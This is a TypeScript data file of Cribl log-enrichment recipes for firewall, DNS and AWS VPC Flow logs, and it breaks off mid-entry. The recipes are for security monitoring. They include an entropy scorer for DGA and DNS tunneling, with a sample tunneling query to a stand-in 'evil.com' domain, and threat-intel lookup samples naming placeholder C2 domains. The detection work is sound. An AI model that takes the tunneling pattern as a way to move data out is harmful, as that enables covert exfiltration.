// @ts-nocheck
export const enrichments = {
  'palo-alto-traffic': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add country, city, ASN, and organization to source_ip and destination_ip using MaxMind or similar GeoIP database.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'src_asn', 'src_org', 'dest_country', 'dest_city', 'dest_asn', 'dest_org'],
        securityValue: 'Enables impossible travel detection, identifies traffic to/from embargoed nations, enriches IOC correlation with geographic context for faster triage.',
        observabilityValue: 'Enables geographic traffic distribution dashboards, identifies regional routing anomalies, supports CDN and egress optimization analysis.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'source_ip',
            additionalInputs: ['destination_ip'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dest_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: source_ip\n// Output Fields: src_country, src_city, src_asn, src_org\n// Repeat for destination_ip with dest_ prefix\n//\n// Result on event:\n// BEFORE: { source_ip: "198.51.100.42", destination_ip: "10.1.2.5" }\n// AFTER:  { source_ip: "198.51.100.42", src_country: "US", src_city: "San Francisco",\n//           src_asn: "AS13335", src_org: "Cloudflare Inc",\n//           destination_ip: "10.1.2.5", dest_country: "RFC1918", dest_city: "Private" }',
          notes: 'MaxMind GeoLite2 databases auto-update weekly via Cribl Stream database management. Enterprise customers can use GeoIP2 Precision for better accuracy.'
        }
      },
      {
        name: 'Internal/External Classification',
        description: 'Tag source and destination IPs as internal (RFC1918/organizational ranges) or external using a CIDR lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['src_internal', 'dest_internal', 'traffic_direction'],
        securityValue: 'Immediately identifies lateral movement (internal→internal), exfiltration (internal→external), and inbound attacks (external→internal) without requiring analysts to memorize network ranges.',
        observabilityValue: 'Enables traffic direction dashboards (north-south vs east-west), baseline internal vs external ratios, detect unexpected routing changes.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'internal_networks.csv',
            inputField: 'source_ip (CIDR match)',
            outputFields: ['src_internal', 'dest_internal', 'traffic_direction'],
            reloadInterval: '5 minutes'
          },
          lookupSample: 'cidr,classification,segment_name\n10.0.0.0/8,internal,corporate\n172.16.0.0/12,internal,cloud-private\n192.168.0.0/16,internal,site-local\n100.64.0.0/10,internal,cgnat-vpn',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: internal_networks.csv (CIDR match mode)\n// Input: source_ip → cidr (CIDR match)\n// Output: classification → src_internal\n//\n// Then add Eval function:\n// traffic_direction = (src_internal==\'internal\' && dest_internal==\'internal\') ? \'east-west\'\n//   : (src_internal==\'internal\') ? \'outbound\' : \'inbound\'\n//\n// Result: { source_ip: "10.1.2.5", src_internal: "internal", dest_internal: "external", traffic_direction: "outbound" }',
          notes: 'Use CIDR match mode in Lookup. Maintain this file from your IPAM system or network team. For Cribl, set the lookup type to "CIDR" and match against the cidr column.'
        }
      },
      {
        name: 'Asset Inventory Lookup',
        description: 'Enrich source/destination IPs with CMDB data: hostname, business unit, criticality tier, environment (prod/dev/staging), and asset owner.',
        criblFunction: 'Lookup',
        addedFields: ['src_hostname', 'src_business_unit', 'src_criticality', 'dest_hostname', 'dest_business_unit', 'dest_criticality'],
        securityValue: 'Prioritize alerts involving critical assets, enable business-unit-scoped detection rules, immediately identify asset owner for investigation without manual lookup.',
        observabilityValue: 'Enable traffic analysis by business unit and environment, identify cross-environment traffic (prod↔dev), support capacity planning per service tier.',
        personas: ['SOC', 'Incident Response', 'Platform Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'asset_inventory.csv',
            inputField: 'source_ip → ip',
            outputFields: ['src_hostname', 'src_business_unit', 'src_criticality'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'ip,hostname,business_unit,criticality,environment,owner\n10.1.2.5,web-prod-01,Commerce,Tier-1,production,platform-team\n10.1.2.6,db-prod-01,Commerce,Tier-1,production,dba-team\n10.1.3.10,dev-api-01,Platform,Tier-3,development,api-team\n10.1.4.20,jump-01,Security,Tier-2,production,security-ops',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: asset_inventory.csv\n// Input: source_ip → ip (exact match)\n// Output: hostname → src_hostname, business_unit → src_business_unit, criticality → src_criticality\n//\n// Duplicate for destination_ip → dest_hostname, dest_business_unit, dest_criticality\n//\n// Result: { source_ip: "10.1.2.5", src_hostname: "web-prod-01", src_business_unit: "Commerce", src_criticality: "Tier-1" }',
          notes: 'Pull from ServiceNow CMDB via REST API on a schedule. Use Cribl Stream scheduled job to refresh the CSV every 4 hours.'
        }
      },
      {
        name: 'Threat Intelligence Lookup',
        description: 'Enrich external IPs and domains against threat feeds (STIX/TAXII, commercial feeds) to identify known malicious infrastructure.',
        criblFunction: 'Lookup',
        addedFields: ['threat_score', 'threat_category', 'threat_feed_source', 'threat_last_seen'],
        securityValue: 'Real-time IOC matching at the pipeline level — alerts fire immediately on known-bad IPs without waiting for SIEM correlation. Reduces detection latency from minutes to seconds.',
        observabilityValue: 'Minimal direct value for observability, but threat-tagged events can be counted for "blocked threats per hour" operational dashboards.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_iocs.csv',
            inputField: 'source_ip → indicator (+ destination_ip)',
            outputFields: ['threat_score', 'threat_category', 'threat_feed_source', 'threat_last_seen'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,type,threat_score,threat_category,feed_source,last_seen\n198.51.100.1,ip,95,C2,AlienVault-OTX,2026-06-05\n203.0.113.50,ip,80,Scanner,AbuseIPDB,2026-06-04\n192.0.2.100,ip,70,Botnet,Emerging-Threats,2026-06-03',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_intel_iocs.csv\n// Input: source_ip → indicator (exact match)\n// Output: threat_score, threat_category, feed_source → threat_feed_source, last_seen → threat_last_seen\n//\n// Filter: Only apply when src_internal != \'internal\' (skip internal IPs for performance)\n//\n// Result: { source_ip: "198.51.100.1", threat_score: 95, threat_category: "C2", threat_feed_source: "AlienVault-OTX" }',
          notes: 'Aggregate multiple STIX/TAXII feeds into a single CSV using a scheduled job. Cribl can pull from TAXII servers directly or consume pre-flattened CSVs from MISP/OpenCTI.'
        }
      },
      {
        name: 'Zone-to-Segment Mapping',
        description: 'Map Palo Alto security zones to logical network segments (DMZ, Trusted Servers, User VLANs, Cloud Egress) using a lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['src_segment', 'dest_segment', 'segment_trust_level'],
        securityValue: 'Enables segmentation violation detection without hardcoding zone names in rules. Alerts on "User VLANs → Trusted Servers on non-standard ports" are clearer than raw zone names.',
        observabilityValue: 'Enables segment-level traffic matrices, monitors cross-segment bandwidth utilization, detects routing policy drift after network changes.',
        personas: ['Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'zone_segment_mapping.csv',
            inputField: 'source_zone → zone_name',
            outputFields: ['src_segment', 'dest_segment', 'segment_trust_level'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'zone_name,segment,trust_level,description\nuntrust,Internet,0,External untrusted traffic\ndmz,DMZ,2,Public-facing services\ntrust,Internal-Servers,4,Trusted internal servers\nusers,User-VLANs,3,End-user workstations\ncloud-egress,Cloud-Egress,3,Traffic to cloud providers',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: zone_segment_mapping.csv\n// Input 1: source_zone → zone_name → Output: segment → src_segment, trust_level → src_trust_level\n// Input 2: destination_zone → zone_name → Output: segment → dest_segment, trust_level → dest_trust_level\n//\n// Result: { source_zone: "users", destination_zone: "trust", src_segment: "User-VLANs", dest_segment: "Internal-Servers" }',
          notes: 'Maintain this mapping when firewall zones change. Typically stable — only needs update during network redesigns.'
        }
      },
      {
        name: 'Application Risk Classification',
        description: 'Enrich the Palo Alto App-ID application field with risk tier (sanctioned, tolerated, unsanctioned) and application category based on corporate policy.',
        criblFunction: 'Lookup',
        addedFields: ['app_risk_tier', 'app_category_custom', 'app_sanctioned'],
        securityValue: 'Immediately flag traffic to unsanctioned applications, enable Shadow IT detection at the network layer, support DLP correlation for risky app usage.',
        observabilityValue: 'Track sanctioned vs unsanctioned app usage trends, monitor bandwidth consumed by risky applications, support application rationalization.',
        personas: ['Security Engineering', 'SOC', 'Compliance', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'app_risk_classification.csv',
            inputField: 'application → app_name',
            outputFields: ['app_risk_tier', 'app_category_custom', 'app_sanctioned'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'app_name,risk_tier,category,sanctioned\nslack,sanctioned,collaboration,true\ndropbox,tolerated,file-sharing,false\nmega-upload,unsanctioned,file-sharing,false\nsalesforce,sanctioned,crm,true\ntor,unsanctioned,anonymizer,false\nbittorrent,unsanctioned,p2p,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: app_risk_classification.csv\n// Input: application → app_name (exact match, case-insensitive)\n// Output: risk_tier → app_risk_tier, category → app_category_custom, sanctioned → app_sanctioned\n//\n// Result: { application: "dropbox", app_risk_tier: "tolerated", app_category_custom: "file-sharing", app_sanctioned: "false" }',
          notes: 'Source this from your CASB or SaaS management platform. Update when new applications are sanctioned or policies change.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Reverse DNS Resolution',
        description: 'Resolve source and destination IPs to hostnames at query time for investigations where asset lookup did not match.',
        criblFunction: 'Search-time lookup',
        addedFields: ['src_rdns', 'dest_rdns'],
        securityValue: 'Provides hostname context during ad-hoc investigations without requiring enrichment at ingest time for every event. Useful for IPs not in CMDB.',
        observabilityValue: 'Adds human-readable context to traffic analysis queries without increasing storage costs.',
        personas: ['Incident Response', 'Threat Hunting', 'NOC'],
        implementation: {
          example: '// Cribl Search query with lookup:\n// dataset="firewall_logs" source_ip="198.51.100.42" earliest=-1h\n// | lookup dns_cache.csv on source_ip=ip output hostname as src_rdns\n// | where isnotnull(src_rdns)\n//\n// Or use the Cribl Search lookup command to resolve at query time:\n// dataset="firewall_logs" earliest=-1h\n// | lookup rdns_cache on source_ip output rdns as src_rdns',
          notes: 'Pre-populate a reverse DNS cache via scheduled Cribl job that resolves IPs seen in the last 24 hours. Avoids real-time DNS lookups during search.'
        }
      },
      {
        name: 'Historical Baseline Comparison',
        description: 'Join current session data against pre-computed hourly/daily baselines (bytes, session count by source/dest pair) to identify statistical anomalies.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['baseline_bytes_avg', 'baseline_sessions_avg', 'deviation_factor'],
        securityValue: 'Enables anomaly detection during investigation — "is this traffic volume normal for this pair?" without requiring real-time ML at pipeline.',
        observabilityValue: 'Supports capacity planning by comparing current vs historical traffic patterns, identifies trending growth per service pair.',
        personas: ['Threat Hunting', 'NOC', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Search dataset join:\n// dataset="firewall_logs" earliest=-1h\n// | summarize current_bytes=sum(bytes), current_sessions=count() by source_ip, destination_ip\n// | join kind=left (\n//     dataset="firewall_baselines" earliest=-8d latest=-1d\n//     | summarize baseline_bytes_avg=avg(total_bytes), baseline_sessions_avg=avg(session_count) by source_ip, destination_ip\n//   ) on source_ip, destination_ip\n// | extend deviation_factor = round(current_bytes / baseline_bytes_avg, 2)\n// | where deviation_factor > 3.0\n// | order by deviation_factor desc',
          notes: 'Requires a pre-computed baseline dataset (run daily aggregation job storing results to Cribl Lake). The join compares current window against historical averages.'
        }
      }
    ]
  },
  'windows-dns': {
    streamTime: [
      {
        name: 'Domain Entropy Scoring',
        description: 'Calculate Shannon entropy of queried domain names to flag algorithmically-generated domains (DGA) and potential DNS tunneling.',
        criblFunction: 'Eval (custom expression)',
        addedFields: ['domain_entropy', 'entropy_risk_level'],
        securityValue: 'Provides a quantitative DGA/tunneling signal at ingest time. High-entropy queries (>4.0) are immediately tagged for SIEM correlation without requiring downstream regex pattern matching.',
        observabilityValue: 'Can be aggregated to track "average entropy per client" as a fleet health metric — sudden spikes indicate malware across endpoints.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'See below',
            outputField: 'domain_entropy'
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expression (Shannon entropy calculation):\n// domain_entropy = C.Text.shannonEntropy(query_name.replace(/\\.[^.]+\\.[^.]+$/, \'\'))\n//\n// Or using manual calculation:\n// const labels = query_name.split(\'.\').slice(0, -2).join(\'\');\n// const freq = {};\n// for (const c of labels) freq[c] = (freq[c]||0) + 1;\n// domain_entropy = -Object.values(freq).reduce((s,f) => s + (f/labels.length) * Math.log2(f/labels.length), 0);\n// entropy_risk_level = domain_entropy > 4.5 ? \'high\' : domain_entropy > 3.5 ? \'medium\' : \'low\'\n//\n// Result: { query_name: "aGVsbG8gd29ybGQ.c2VjcmV0.evil.com", domain_entropy: 4.8, entropy_risk_level: "high" }\n//         { query_name: "www.google.com", domain_entropy: 2.1, entropy_risk_level: "low" }',
          notes: 'Entropy > 4.0 correlates strongly with DGA and DNS tunneling. Legitimate domains rarely exceed 3.5. Tune the threshold for your environment.'
        }
      },
      {
        name: 'Domain Age Lookup',
        description: 'Enrich queried domains with registration age from WHOIS data or commercial feed. Flag domains registered within last 30 days as newly-registered.',
        criblFunction: 'Lookup',
        addedFields: ['domain_age_days', 'newly_registered', 'registrar'],
        securityValue: 'Newly-registered domains are heavily correlated with malware C2, phishing, and DGA infrastructure. Flagging at pipeline reduces SIEM detection logic complexity.',
        observabilityValue: 'Minimal direct observability value, but "newly registered domain query rate" is a useful security posture metric on operational dashboards.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'domain_whois.csv',
            inputField: 'query_name (extract base domain) → domain',
            outputFields: ['domain_age_days', 'newly_registered', 'registrar'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'domain,registration_date,age_days,newly_registered,registrar\nevil-phishing.com,2026-06-01,5,true,NameCheap\ngoogle.com,1997-09-15,10492,false,MarkMonitor\nsuspicious-login.xyz,2026-05-28,9,true,Njalla',
          example: '// Cribl Stream → Processing Pipeline:\n// Step 1: Eval function to extract base domain:\n//   base_domain = query_name.split(\'.\').slice(-2).join(\'.\')\n// Step 2: Lookup function:\n//   Lookup File: domain_whois.csv\n//   Input: base_domain → domain\n//   Output: age_days → domain_age_days, newly_registered, registrar\n//\n// Result: { query_name: "login.evil-phishing.com", domain_age_days: 5, newly_registered: "true", registrar: "NameCheap" }',
          notes: 'Populate via daily WHOIS enrichment job on unique domains seen. Use bulk WHOIS APIs (DomainTools, WhoisXML) for efficiency. Only lookup domains not already in cache.'
        }
      },
      {
        name: 'DHCP Lease Correlation',
        description: 'Lookup client IP against DHCP lease table to add client hostname, MAC address, and device type. Critical for environments with dynamic IP assignment.',
        criblFunction: 'Lookup',
        addedFields: ['client_hostname', 'client_mac', 'device_type', 'dhcp_scope'],
        securityValue: 'Converts ephemeral IP addresses into stable device identities. Essential for investigation — "which device queried this malicious domain?" is answered without manual DHCP log correlation.',
        observabilityValue: 'Enables per-device DNS health metrics, identifies misconfigured devices generating excessive queries, supports device inventory validation.',
        personas: ['SOC', 'Incident Response', 'NOC', 'Active Directory Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'dhcp_leases.csv',
            inputField: 'client_ip → ip',
            outputFields: ['client_hostname', 'client_mac', 'device_type', 'dhcp_scope'],
            reloadInterval: '5 minutes'
          },
          lookupSample: 'ip,hostname,mac,device_type,scope\n10.1.2.100,WKSTN-JSMITH,AA:BB:CC:11:22:33,workstation,Corp-Users\n10.1.2.101,WKSTN-JDOE,AA:BB:CC:11:22:34,workstation,Corp-Users\n10.1.5.50,PRINT-FL3,DD:EE:FF:44:55:66,printer,IoT-Devices\n10.1.6.200,IPAD-GUEST-42,11:22:33:AA:BB:CC,mobile,Guest-WiFi',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: dhcp_leases.csv\n// Input: client_ip → ip (exact match)\n// Output: hostname → client_hostname, mac → client_mac, device_type, scope → dhcp_scope\n//\n// Result: { client_ip: "10.1.2.100", client_hostname: "WKSTN-JSMITH", client_mac: "AA:BB:CC:11:22:33", device_type: "workstation" }',
          notes: 'Export DHCP leases from Windows DHCP or Infoblox every 5 minutes. For Windows: PowerShell Get-DhcpServerv4Lease | Export-Csv. For Infoblox: WAPI /lease endpoint.'
        }
      },
      {
        name: 'Threat Intelligence Domain Lookup',
        description: 'Enrich queried domain against threat feeds to identify known malicious, phishing, and C2 domains.',
        criblFunction: 'Lookup',
        addedFields: ['domain_threat_score', 'domain_threat_category', 'domain_feed_source'],
        securityValue: 'Pipeline-level IOC matching for DNS — malicious domain queries are tagged before reaching SIEM. Enables real-time alerting and blocking recommendations.',
        observabilityValue: 'Supports "blocked threat volume" dashboards and threat category trending for security posture reporting.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_domains.csv',
            inputField: 'query_name (base domain) → domain',
            outputFields: ['domain_threat_score', 'domain_threat_category', 'domain_feed_source'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'domain,threat_score,category,feed_source\nevil-c2-server.com,99,C2,Mandiant\nphishing-bank-login.net,95,Phishing,PhishTank\ncryptominer-pool.xyz,80,Cryptomining,Emerging-Threats',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_domains.csv\n// Input: base_domain → domain (extract base domain first via Eval)\n// Output: threat_score → domain_threat_score, category → domain_threat_category, feed_source → domain_feed_source\n//\n// Pre-processing Eval: base_domain = query_name.split(\'.\').slice(-2).join(\'.\')\n//\n// Result: { query_name: "beacon.evil-c2-server.com", domain_threat_score: 99, domain_threat_category: "C2" }',
          notes: 'Aggregate feeds from MISP, PhishTank, URLhaus, and commercial providers into single CSV. Use Cribl scheduled job to pull and merge feeds every 15 minutes.'
        }
      },
      {
        name: 'Internal Zone Classification',
        description: 'Tag queries to internal zones (.corp.local, .internal, AD _msdcs zones) vs external domains using a zone list lookup.',
        criblFunction: 'Lookup',
        addedFields: ['domain_zone_type', 'is_internal'],
        securityValue: 'Enables clean segmentation of internal vs external DNS queries. Security detections can focus on external queries only, dramatically reducing false positive volume.',
        observabilityValue: 'Enables separate dashboards for internal resolution health (AD/services) vs external resolution health (internet), isolating issues to the correct team.',
        personas: ['SOC', 'NOC', 'Active Directory Team', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'internal_zones.csv',
            inputField: 'query_name (suffix match) → zone_suffix',
            outputFields: ['domain_zone_type', 'is_internal'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'zone_suffix,zone_type,is_internal,description\n.corp.local,internal,true,Corporate Active Directory\n._msdcs.corp.local,internal,true,AD Domain Controller locator\n.internal.company.com,internal,true,Internal services\n.dev.company.com,internal,true,Development environment',
          example: '// Cribl Stream → Processing → Eval + Lookup\n// Step 1 - Eval: Check if query_name ends with known internal suffixes\n//   is_internal = query_name.endsWith(\'.corp.local\') || query_name.endsWith(\'.internal.company.com\') ? \'true\' : \'false\'\n//   domain_zone_type = is_internal == \'true\' ? \'internal\' : \'external\'\n//\n// Or Step 1 - Lookup with suffix/regex match:\n//   Lookup File: internal_zones.csv (regex mode)\n//   Input: query_name matches zone_suffix pattern\n//\n// Result: { query_name: "dc01._msdcs.corp.local", is_internal: "true", domain_zone_type: "internal" }',
          notes: 'Keep this list updated when new internal zones are created. Typically very stable — only changes during AD restructuring or new service domains.'
        }
      }
    ],
    searchTime: [
      {
        name: 'VirusTotal Domain Reputation',
        description: 'At investigation time, join queried domains against cached VirusTotal results for multi-engine detection scores.',
        criblFunction: 'Search-time lookup',
        addedFields: ['vt_detection_ratio', 'vt_categories', 'vt_last_analysis_date'],
        securityValue: 'Provides rich threat context during investigation without paying for API calls on every DNS query at ingest time. Analysts see detection ratios inline with query results.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search query with lookup:\n// dataset="dns_logs" earliest=-1h\n// | where is_internal == "false"\n// | extend base_domain = split(query_name, ".") | array_slice(base_domain, -2) | strcat_array(".")\n// | lookup vt_results.csv on base_domain=domain output detection_ratio as vt_detection_ratio, categories as vt_categories\n// | where vt_detection_ratio > 0\n// | order by vt_detection_ratio desc',
          notes: 'Cache VT results in a lookup table populated by a scheduled job that queries VT API for domains seen in the last 24h. Rate limit: 4 requests/minute on free tier.'
        }
      },
      {
        name: 'User Identity Join',
        description: 'Join client IP with Active Directory authentication logs to identify the logged-in user at the time of the DNS query.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['querying_user', 'user_department', 'user_title'],
        securityValue: 'Attributes DNS queries to specific users during investigation — "who was logged into this machine when it queried the C2 domain?" is answered in a single search.',
        observabilityValue: 'Supports per-user DNS usage analysis for capacity planning and acceptable use policy auditing.',
        personas: ['Incident Response', 'SOC', 'Compliance'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="dns_logs" client_ip="10.1.2.100" earliest=-1h\n// | join kind=left (\n//     dataset="ad_logon_events" event_id==4624 earliest=-2h\n//     | summarize last_logon=max(timestamp) by source_ip, target_username, target_domain\n//   ) on client_ip=source_ip\n// | extend querying_user = target_username\n// | where isnotnull(querying_user)',
          notes: 'Joins DNS queries with AD logon events to attribute queries to users. Works best with short time windows. The AD dataset needs logon type 2 (interactive) and 10 (RDP) events.'
        }
      }
    ]
  },
  'aws-vpc-flow': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context (country, city, ASN, organization) to source and destination IPs for all external traffic.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_asn', 'src_org', 'dest_country', 'dest_asn', 'dest_org'],
        securityValue: 'Identifies traffic to/from unexpected countries, embargoed nations, or known bulletproof hosting ASNs. Critical for exfiltration and C2 detection.',
        observabilityValue: 'Enables geographic traffic distribution analysis, identifies unexpected international traffic patterns, supports CDN/edge optimization decisions.',
        personas: ['Cloud Security', 'SOC', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'srcaddr',
            additionalInputs: ['dstaddr'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: srcaddr  →  Output Prefix: src_\n// Input Field: dstaddr  →  Output Prefix: dest_\n// Filter: Only apply when srcaddr NOT in RFC1918 ranges (skip internal)\n//\n// Result: { srcaddr: "203.0.113.50", src_country: "DE", src_asn: "AS24940", src_org: "Hetzner Online" }',
          notes: 'Only enrich external IPs — skip RFC1918/RFC6598 ranges for performance. Use a pre-filter condition: !srcaddr.match(/^(10\\.|172\\.(1[6-9]|2|3[01])\\.|192\\.168\\.)/).'
        }
      },
      {
        name: 'AWS Account/VPC Metadata',
        description: 'Enrich ENI (interface-id) with AWS account name, VPC name, subnet name, security group associations, and environment tag.',
        criblFunction: 'Lookup',
        addedFields: ['account_name', 'vpc_name', 'subnet_name', 'environment', 'security_groups'],
        securityValue: 'Converts opaque ENI IDs into meaningful context — "production database subnet received unexpected inbound from dev account" is immediately actionable.',
        observabilityValue: 'Enables cost allocation by VPC/account, cross-AZ traffic analysis with named subnets, and service dependency mapping with meaningful labels.',
        personas: ['Cloud Security', 'Platform Engineering', 'SRE', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'aws_eni_metadata.csv',
            inputField: 'interface_id → eni_id',
            outputFields: ['account_name', 'vpc_name', 'subnet_name', 'environment', 'security_groups'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'eni_id,account_name,vpc_name,subnet_name,environment,security_groups\neni-0123abcd,prod-commerce,vpc-prod-east,subnet-app-tier,production,sg-web-alb;sg-default\neni-0456efgh,prod-commerce,vpc-prod-east,subnet-db-tier,production,sg-postgres;sg-default\neni-0789ijkl,dev-platform,vpc-dev-west,subnet-dev-general,development,sg-allow-all',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: aws_eni_metadata.csv\n// Input: interface_id → eni_id\n// Output: account_name, vpc_name, subnet_name, environment, security_groups\n//\n// Result: { interface_id: "eni-0123abcd", account_name: "prod-commerce", vpc_name: "vpc-prod-east", environment: "production" }',
          notes: 'Generate via AWS CLI: aws ec2 describe-network-interfaces across all accounts. Use Cribl scheduled job with AWS credentials to refresh every 30 minutes. Consider AWS Organizations for multi-account.'
        }
      },
      {
        name: 'Service Tag Classification',
        description: 'Map well-known destination ports to service names and protocols (443→HTTPS, 5432→PostgreSQL, 6379→Redis, 8080→HTTP-Alt).',
        criblFunction: 'Lookup',
        addedFields: ['service_name', 'service_category', 'is_encrypted'],
        securityValue: 'Enables service-aware detection rules — "Redis traffic to internet" is more actionable than "port 6379 to external." Also flags unencrypted protocols.',
        observabilityValue: 'Enables service-level traffic analysis without application instrumentation. Track which services consume the most network bandwidth.',
        personas: ['Cloud Security', 'SRE', 'Platform Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'port_service_map.csv',
            inputField: 'dstport → port',
            outputFields: ['service_name', 'service_category', 'is_encrypted'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'port,service_name,service_category,is_encrypted\n22,SSH,remote-access,true\n80,HTTP,web,false\n443,HTTPS,web,true\n3306,MySQL,database,false\n5432,PostgreSQL,database,false\n6379,Redis,cache,false\n8080,HTTP-Alt,web,false\n8443,HTTPS-Alt,web,true\n27017,MongoDB,database,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: port_service_map.csv\n// Input: dstport → port (exact match)\n// Output: service_name, service_category, is_encrypted\n//\n// Result: { dstport: "5432", service_name: "PostgreSQL", service_category: "database", is_encrypted: "false" }',
          notes: 'Start with IANA well-known ports and add custom application ports specific to your environment. Flag is_encrypted=false for compliance scanning.'
        }
      },
      {
        name: 'Threat Intelligence IP Lookup',
        description: 'Enrich external source/destination IPs against threat feeds for known malicious infrastructure.',
        criblFunction: 'Lookup',
        addedFields: ['threat_score', 'threat_category', 'threat_feed_source'],
        securityValue: 'VPC Flow Logs capture all network connections including those bypassing higher-level inspection. Threat intel at this layer catches C2 that evades application-layer controls.',
        observabilityValue: 'Provides "threat encounters per VPC" metric for security posture dashboards without requiring SIEM-level correlation.',
        personas: ['Cloud Security', 'SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_iocs.csv',
            inputField: 'srcaddr → indicator',
            outputFields: ['threat_score', 'threat_category', 'threat_feed_source'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,threat_score,threat_category,feed_source\n198.51.100.1,95,C2,AlienVault-OTX\n203.0.113.50,80,Scanner,AbuseIPDB\n192.0.2.100,70,Botnet,Emerging-Threats',
          example: '// Cribl Stream → Processing → Lookup Function\n// Same pattern as Palo Alto threat intel lookup\n// Input: srcaddr → indicator (for inbound), dstaddr → indicator (for outbound)\n// Filter: Only check external IPs (skip when flow_direction==\'east-west\')\n//\n// Result: { srcaddr: "198.51.100.1", threat_score: 95, threat_category: "C2", threat_feed_source: "AlienVault-OTX" }',
          notes: 'Reuse the same threat intel CSV across all sources. One lookup file serves Palo Alto, VPC Flow, DNS, and other IP-based enrichments.'
        }
      },
      {
        name: 'Traffic Direction Tagging',
        description: 'Classify flows as ingress, egress, east-west, or cross-AZ based on source/destination subnet membership and ENI attachment.',
        criblFunction: 'Eval + Lookup',
        addedFields: ['flow_direction', 'cross_az', 'cross_vpc'],
        securityValue: 'Enables direction-aware detection — lateral movement (east-west), exfiltration (egress to internet), and inbound scanning (ingress) each have distinct detection patterns.',
        observabilityValue: 'Cross-AZ traffic directly maps to AWS data transfer costs. This enrichment enables cost dashboards showing exactly which service pairs drive cross-AZ charges.',
        personas: ['Cloud Security', 'Platform Engineering', 'SRE', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'See below',
            outputFields: ['flow_direction', 'cross_az', 'cross_vpc']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions (add multiple fields):\n//\n// flow_direction = (src_internal && dest_internal) ? \'east-west\'\n//   : (src_internal && !dest_internal) ? \'egress\'\n//   : (!src_internal && dest_internal) ? \'ingress\' : \'transit\'\n//\n// cross_az = (src_az && dest_az && src_az != dest_az) ? \'true\' : \'false\'\n// cross_vpc = (src_vpc && dest_vpc && src_vpc != dest_vpc) ? \'true\' : \'false\'\n//\n// Requires: Internal/External Classification enrichment to run first (provides src_internal/dest_internal)\n// Requires: AWS metadata enrichment for AZ and VPC fields\n//\n// Result: { flow_direction: "egress", cross_az: "false", cross_vpc: "false" }',
          notes: 'Cross-AZ flows incur AWS data transfer charges (~$0.01/GB). Tagging these enables cost dashboards showing which service pairs drive cross-AZ costs.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Security Group Rule Correlation',
        description: 'Join flow logs with security group rule configurations to identify which specific rule allowed or denied the traffic.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['sg_rule_id', 'sg_rule_description', 'sg_name'],
        securityValue: 'During investigation, immediately identifies which security group rule allowed suspicious traffic. Eliminates manual AWS Console lookup during incident response.',
        observabilityValue: 'Enables security group utilization analysis — which rules are actually being hit? Supports rule cleanup and optimization.',
